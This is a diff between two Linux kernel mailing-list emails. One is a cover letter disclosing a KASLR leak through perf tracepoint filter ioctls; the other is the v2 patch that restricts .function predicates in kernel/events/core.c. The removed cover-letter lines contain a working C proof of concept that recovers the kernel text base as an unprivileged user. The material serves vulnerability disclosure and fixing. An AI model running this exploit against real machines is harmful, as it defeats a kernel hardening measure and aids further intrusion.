@@ -1,62 +1,64 @@
-Received: from mail-dy2-f41.google.com (mail-dy2-f41.google.com [74.125.229.41])
+Received: from mail-dl2-f12.google.com (mail-dl2-f12.google.com [74.125.229.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0A0DE2F531B
-	for <linux-kernel@vger.kernel.org>; Thu,  1 Oct 2026 23:46:23 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.41
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9A05038735A
+	for <linux-kernel@vger.kernel.org>; Thu,  1 Oct 2026 23:46:26 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.229.140
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790898385; cv=none; b=bld8TXzFPc2p0LNTUo0CBHY2x06x8G3nKm1QgoZAatiraHx5F7MlNR8QNtxW9yMlYks6/H9XcaRgU5CoMSL7DxPGHc935ZyzDcXeQgft8sEN5/TttQYIpPDN3u7qPdJTwXVhV+A0hVh9igAx01zGBVqgiaFvmpZG6dTOt3fWA5s=
+	t=1790898388; cv=none; b=Elb74OxYFS6i0CguH+xPSrOCwdOCxtv5HKvcK1LLmQ9hi97O4hguM1j293cPPE3VJMyZHpYyxcLrXIgdcHgB/uT8VvypyWkJhEo3rwX+EfHsnUrT8dHx8QID66GiJIH+ITTrmwADoXUcq3RmoC3qnVlS3/ggA1AQs7pj/FaQ1jU=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790898385; c=relaxed/simple;
-	bh=xAV81QeqR4ZtpFqOVKF9+IHtT4wTiC4bAZ5jEUD3yEo=;
-	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=Q1DLhTlgG2p0gMebbeUFUFj90rJ/hQFTZ+l03PuQ7H0Tv67syG3njXlerBlDC/Skd4Puez6aVeCmzO3fRjOXhXbXMElYQlmBhlyF4fPu2lxzUzC4FyGkP4eyz+7i1AJCsXx0Wl974sb7kvHorFPVC8U9StO1iLl802QOeEGdVrA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Qcty6SCC; arc=none smtp.client-ip=74.125.229.41
+	s=arc-20240116; t=1790898388; c=relaxed/simple;
+	bh=Whjk9IC5hygHpAH3BmB9KIBiB7myeCeEHo2qEY17RHc=;
+	h=From:To:Cc:Subject:Date:Message-Id:In-Reply-To:References:
+	 MIME-Version; b=OCJ2SLCL5DfKTDhs3bC8Vzo39CvNFvBiYKFythWmrH7s7tolTtXK4F43Sli5A12yLLIdvDRqxgf9ZHKReGvtSX42vR6WG4yV3rMjY8njxnXwn4dVaUurSHMxTabEJfyxhbKwjg2CpvLssQwRH3Po8AsgL0UWe1D5SGxbO3h5w9Q=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=euEe1hdh; arc=none smtp.client-ip=74.125.229.140
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Qcty6SCC"
-Received: by mail-dy2-f41.google.com with SMTP id 5a478bee46e88-34b590a5b5eso3921838eec.2
-        for <linux-kernel@vger.kernel.org>; Thu, 01 Oct 2026 16:46:23 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="euEe1hdh"
+Received: by mail-dl2-f12.google.com with SMTP id a92af1059eb24-142dd046b87so5611981c88.2
+        for <linux-kernel@vger.kernel.org>; Thu, 01 Oct 2026 16:46:26 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1790898383; x=1791503183; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
-        b=Qcty6SCCxo8yyusn1pqFL9mTlnmwVvyZH7jhAfY/+qGz1D7ZF9Cb2ZvKpVs0nWQ1U2
-         tYIMN9hV86Vt7OlkhvvnhItcS4GlnqvzyV3bq1IglvH76vnIWy2hHq/uqdd0kaIBF/5k
-         3nZkrxs6eGpZb5/4H+/my9YvcxAna+MfA+PxhXioXSPYtGxPAk97EjtGSePMuiKIo2Ba
-         R6BkhbI5zKZKB64a9dERdGSHvdTuwlk7Y1EKqfhLuSV4M9Rb83xGWHYmpIwiZwNpx7V4
-         SIXo8PAuoG/S7FXAZ79tkDrNQd+1TgiIZYAjTAZLPAgW1idhy0Tyo52GAHDA/ZJqBomC
-         bv7g==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1790898383; x=1791503183;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1790898386; x=1791503186; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=SgLgFlJ5lNb0xBi63DpiDCEsIJzMQgnYp0doLWd9kSc=;
-        b=cm3JD1m9Jeh+xfhgru4ARr/uRJ9nF8wuZkC6QmXygwkOKbE2r/xzsEsUkibj8w9OU3
-         K4hdmyhCWWWcsv68+eEGnXoc/8icLsTCQa+IwEY0DAGZzsPIaXdnsb+3a5MenKOkeAfZ
-         qBDnCYplaY6uTZxges9L3th7OmE43zacj2dGeqhWc95CB2S1+/k3p7h6t7RWGE++PFbw
-         Aq6Zdu39IMxF6fZFBpmpK/4P7fNly+VtYrUWPPjvCROqpgGAUp1iTcKki9sOCyQ7FqSF
-         o6TYcEdsB36nqMY6SlbrLdNJSFDk7pNTkICg0ciuJQ2peaTaAuzO8gjyvaaZlCcs5XeW
-         tG9Q==
-X-Forwarded-Encrypted: i=1; AKwUvByaYfEwpgO1HD6h9X/fvTMOGC6XUKVXEZRQv4i/zOunES33o5yAbV4hER9r8pu0wTR0YW6KzcyGRMgXDoY=@vger.kernel.org
-X-Gm-Message-State: AFuF++maeWMqh1foickQGAmdJAttgcsNWL89naS7Vb8yHXrSlQunVtGJ
-	A4uLjgcgUXf24Ted8xRKL8XQro+p641Klu4zD31H3vT5htBnlfYNyWs6sUyhqg==
-X-Gm-Gg: AYBFou0JkYA089iQ+vVoQBJGBitZP/3AtB8zE0FmwDrRLfoSK42K7XGne+1b1w6EWdl
-	YPxBG1RMKHkD9S8fifpUrJcL+ixgJaAiPymRn0wgCgPIlkhX4d+If628KbpT1CJwxMKN++n7Vym
-	IcmRP9su8HUtMiBST9+1qFbgYsc80aRdI0n6un2yBSmT67rfmfSJMKhx5hvqztyBmB1/KM3lNEN
-	JdtYTmbxYoFXg2xbkoNoETPv0GkeX90gK/4A+mxNurjenccedQwmAApV9okRSZkA5Cs4HoEy/NV
-	meVWm74upwojghBkqWBWQpPqfsJyq/vnIFVDWdno7YwXvt06j8rXVWRsy068dhotIZim26ezcto
-	fm3D1LydFHJ8vsr1VN18gMAtQHskKojF6WXJ/DjuJ+2LIelDqnUk+47MyMQ7hGAqN8PWQuc+t58
-	sy5Xx8B/hYt0iWw4GFiKK7Z8FMme8tHEXwRubZPc4VKg9C+nT3PpVOiGe/+56vqinMd03J5is9X
-	8DO5AQ0
-X-Received: by 2002:a05:7023:a5c:20b0:14d:baf5:c415 with SMTP id a92af1059eb24-14f5b21a47dmr842213c88.7.1790898382988;
-        Thu, 01 Oct 2026 16:46:22 -0700 (PDT)
+        bh=h2hby3hPpEJUKa8O9qSBl+BlKsHlHonnOrzx+w19uMQ=;
+        b=euEe1hdhF6VfSCJaFC3mITA/GfSSHXHztkyVXq/xe1bHJR54WDJmEODB8IAMYdP8Zs
+         vUhM9NOsgWba/HE09LXsv/PRB6DL8i7CTo+H0Zyiemnjy4Mr9NhFSYptrCoxdg8tGA3Z
+         BmoiJWdx0aiK3ogTp3m89tfOlUDZsKUvnghiP4hxXABflBetg9hFZ5OQVwWJYcPvssPr
+         ayNyEBld2HJBpnCtOtdGVl15SnyHBEhkdovuWl6wlGZ1ejn2mhqYm86voMOIeMHrpmcY
+         H+RK8vpwJvXXXgvcqbIt7UldFZ9GHO98yMdpQKoMQ8Hci2OFWKtJR+ymtro9Vvf97Uci
+         8h7Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1790898386; x=1791503186;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=h2hby3hPpEJUKa8O9qSBl+BlKsHlHonnOrzx+w19uMQ=;
+        b=s9a8e4CNoN9kalKiZPOWM1ICsbXZ/4Hjjo6Rb2esn1M43B4+eyi8zDssVHDg5fIYtC
+         D5oMlU6Tulj5pgcVJmxY4bWrguZ/prz0I6lb8igUL5POn23Vg2jYsPAaHxOR0uQn7NYf
+         sUBf1dpniHzannTKJb2tCslnypFmGf9BU0l4bcf0jUnaDTJNGnk5VZd1wvahTF3oQbd8
+         sMpP33sitFE88sd4oH4hWD1fnJWkMaWdKOZMV/fDFJSGmuEG3Z3SesuaH6M7bpM8phoW
+         3CrwJuaClwa2/CqOQZJXr9syD0/q0mWhB8JZ/oMUnJCYNgIs8MubToT3dSrfNvBSOiOx
+         H32Q==
+X-Forwarded-Encrypted: i=1; AKwUvBxeK46026odG5XXrOe3VEa1dR3EjKcQVAj//RlnEMzQ2T/WkM/VmsdaetvVDeMMt8/JWCsK0wtQ8dU83bk=@vger.kernel.org
+X-Gm-Message-State: AFq9FYIuVDP3bPsgnSUaELG9GXU7UCG753u0lRW4y28O5ZcY78bxdIgB
+	Rdg9vJXH1I26wKXzkm38frIRqReMpotGdpuvTOA0kUBEyNk0O10yFGh0MzO9ng==
+X-Gm-Gg: AYBFou1rbIMipJjBgl/7TNPM+H3R7cP4mr2mwxMeMN0M5rdgcf9hqTyrKy06Lp8Uhqx
+	Y7De2s4YrTZRAiiB/590qLfgjArKcn4CsXTbSnRovtqBIRZcI3drhNDfZred/89NHSPjP1hIKMa
+	En1GhOBR33GayfrjCNhGXR5zOtGYgFV8krvJaHIuivc/xS6/ukef+iWCqKlQ1wsXN9pIeYl2hUW
+	5+/4Le6r5p+TUgynX0VM3RKJCSZ6QFiPU/zYSNGyglKQ3FcBoS7oga/epNxy97U9KVesD1m0kfR
+	VsmlElHA+2QZu3DzBtGknPhFHlyhCvjV1TNM/DJARK5INreAD+mC19NhPuXnmHKT/ynxDXQn7i/
+	HYyzB7C5FF4Kv2bLAUvP5lgCVg1cCz8YBEVRbsuvpihgoTp9FxzVUUFnz0qJH6uGCey+zuHlZ24
+	tUudYFFlomYOicNsSWuBZnXGEI07/q06tny77VpvQdX4lPAEynPTtRmk2Z6cNK4WT7NzWSjQ9/U
+	x5YQ3Ki
+X-Received: by 2002:a05:7022:ea8b:b0:148:302e:1bed with SMTP id a92af1059eb24-14f5c2f1505mr962254c88.38.1790898385400;
+        Thu, 01 Oct 2026 16:46:25 -0700 (PDT)
 Received: from kq.cs.ucr.edu (kq.cs.ucr.edu. [169.235.27.223])
-        by smtp.gmail.com with ESMTPSA id a92af1059eb24-14f45fedd43sm2542818c88.4.2026.10.01.16.46.22
+        by smtp.gmail.com with ESMTPSA id a92af1059eb24-14f45fedd43sm2542818c88.4.2026.10.01.16.46.24
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 01 Oct 2026 16:46:22 -0700 (PDT)
+        Thu, 01 Oct 2026 16:46:25 -0700 (PDT)
 From: Zhengchuan Liang <zcliangcn@gmail.com>
 To: Peter Zijlstra <peterz@infradead.org>
 Cc: Ingo Molnar <mingo@redhat.com>,
@@ -76,10 +78,12 @@ Cc: Ingo Molnar <mingo@redhat.com>,
 	linux-trace-kernel@vger.kernel.org,
 	linux-kernel@vger.kernel.org,
 	Zhengchuan Liang <zcliangcn@gmail.com>
-Subject: [PATCH v2 0/1] perf/core: Prevent tracepoint filters from exposing the kernel text base
-Date: Thu,  1 Oct 2026 16:46:10 -0700
-Message-Id: <cover.1790891867.git.zcliangcn@gmail.com>
+Subject: [PATCH v2 1/1] perf/core: Restrict function predicates in trace event filters
+Date: Thu,  1 Oct 2026 16:46:11 -0700
+Message-Id: <e66d86bf790ce51ca865c354a9b7a716c08b552f.1790891867.git.zcliangcn@gmail.com>
 X-Mailer: git-send-email 2.25.1
+In-Reply-To: <cover.1790891867.git.zcliangcn@gmail.com>
+References: <cover.1790891867.git.zcliangcn@gmail.com>
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
@@ -88,60 +92,103 @@ List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi,
+Count-only perf tracepoint events can be opened without tracepoint
+permission because they do not expose raw sample data. Their
+PERF_EVENT_IOC_SET_FILTER ioctl can still pass filter expressions to the
+tracing parser.
 
-I found and validated an information leak in
-kernel/trace/trace_events_filter.c. An unprivileged user can recover the
-randomized kernel text base, revealing the kernel's KASLR slide, by
-observing PERF_EVENT_IOC_SET_FILTER return values for a disabled,
-count-only perf tracepoint event.
+A .function operand makes the parser resolve either a numeric kernel
+address or a kernel symbol. The ioctl return value can therefore be used
+as an oracle to recover the randomized kernel text base.
 
-Such an event can be opened with exclude_kernel=1 and sample_type=0. The
-ioctl nevertheless accepts .function predicates. A numeric operand is
-passed to kallsyms_lookup_size_offset(), so success distinguishes an
-address in the kernel image from one outside it. A symbolic operand
-likewise resolves a kernel symbol internally and can compare its address
-with a task-controlled tracepoint field.
+Trace events marked TRACE_EVENT_FL_CAP_ANY are different: task-local
+events may expose their raw fields to unprivileged users. Syscall
+tracepoints and uprobes deliberately use this exception, so denying every
+filter without tracepoint permission would break their ordinary filters.
 
-Here is a minimized numeric PoC for an x86_64 kernel built with
-CONFIG_KALLSYMS_ALL=y. The scan uses 2 MiB steps, the minimum permitted
-value of CONFIG_PHYSICAL_ALIGN on x86_64, and covers the 1 GiB virtual
-KASLR window. Event ID 5 identifies the built-in TRACE_PRINT event.
-The upstream default is perf_event_paranoid=2. Some distributions retain
-that setting, while others use a stricter value. With the default
-setting, run the PoC as an unprivileged user:
+Check perf_allow_tracepoint() in perf. If permission is denied, continue
+only for a task-attached TRACE_EVENT_FL_CAP_ANY event whose filter does
+not contain an unquoted .function postfix. This rejects the predicate
+before the tracing parser can resolve either form of operand. The scan
+uses the parser's quote rules, so .function inside a string operand
+remains an ordinary filter value.
 
-  #define _GNU_SOURCE
-  #include <linux/perf_event.h>
-  #include <stdio.h>
-  #include <sys/ioctl.h>
-  #include <sys/syscall.h>
-  #include <unistd.h>
+This preserves ordinary filters on task-local events whose fields are
+already available to the caller, while non-CAP_ANY filters and kernel
+address resolution remain unavailable without tracepoint permission.
 
-  int main(void)
-  {
-          struct perf_event_attr a = {
-                  .type = PERF_TYPE_TRACEPOINT, .size = sizeof(a),
-                  .config = 5, .disabled = 1, .exclude_kernel = 1,
-          };
-          int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
-          char filter[64];
+Fixes: e6745a4da964 ("tracing: Add a way to filter function addresses to function names")
+Cc: stable@vger.kernel.org
+Assisted-by: LLM
+Signed-off-by: Zhengchuan Liang <zcliangcn@gmail.com>
+---
+Changes in v2:
+- Keep the entire fix in perf, without modifying kernel/trace/*, as
+  requested by Steven.
+- Preserve ordinary filters for task-local TRACE_EVENT_FL_CAP_ANY events
+  while rejecting their unquoted .function predicates without tracepoint
+  permission.
+- Reject all filters on other trace events without tracepoint permission.
+- Follow the tracing parser's quote rules so .function inside a string
+  operand remains an ordinary value.
 
-          if (fd < 0)
-                  return 1;
-          for (unsigned long long p = 0xffffffff80000000ULL;
-               p < 0xffffffffc0000000ULL; p += 0x200000ULL) {
-                  snprintf(filter, sizeof(filter),
-                           "ip.function == 0x%llx", p);
-                  if (!ioctl(fd, PERF_EVENT_IOC_SET_FILTER, filter)) {
-                          printf("_stext=0x%llx\n", p);
-                          return 0;
-                  }
-          }
-          return 2;
-  }
+v1: https://lore.kernel.org/all/95d3721fa8d4c7a4577ec14e9d7caec4fd0cefcc.1790553331.git.zcliangcn@gmail.com/
 
-I reproduced the leak under these conditions as an unprivileged user on
-a kernel built from the current upstream tree. The reported _stext
-matched the value in /proc/kallsyms as read by root. The PoC needs no
-tracefs access or perf sample data.
+ kernel/events/core.c | 35 +++++++++++++++++++++++++++++++++++
+ 1 file changed, 35 insertions(+)
+
+diff --git a/kernel/events/core.c b/kernel/events/core.c
+index 634d2ccbab82..11db8689ac90 100644
+--- a/kernel/events/core.c
++++ b/kernel/events/core.c
+@@ -12251,6 +12251,33 @@ perf_event_set_addr_filter(struct perf_event *event, char *filter_str)
+ 	return ret;
+ }
+ 
++#ifdef CONFIG_EVENT_TRACING
++static bool perf_event_filter_has_function(const char *filter_str)
++{
++	char quote = 0;
++
++	for (; *filter_str; filter_str++) {
++		if (quote) {
++			if (*filter_str == quote)
++				quote = 0;
++			continue;
++		}
++
++		switch (*filter_str) {
++		case '\'':
++		case '"':
++			quote = *filter_str;
++			break;
++		default:
++			if (str_has_prefix(filter_str, ".function"))
++				return true;
++		}
++	}
++
++	return false;
++}
++#endif
++
+ static int perf_event_set_filter(struct perf_event *event, void __user *arg)
+ {
+ 	int ret = -EINVAL;
+@@ -12264,6 +12291,14 @@ static int perf_event_set_filter(struct perf_event *event, void __user *arg)
+ 	if (perf_event_is_tracing(event)) {
+ 		struct perf_event_context *ctx = event->ctx;
+ 
++		ret = perf_allow_tracepoint();
++		if (ret && (!(event->attach_state & PERF_ATTACH_TASK) ||
++			    !(event->tp_event->flags & TRACE_EVENT_FL_CAP_ANY) ||
++			    perf_event_filter_has_function(filter_str))) {
++			kfree(filter_str);
++			return ret;
++		}
++
+ 		/*
+ 		 * Beware, here be dragons!!
+ 		 *
+-- 
+2.25.1
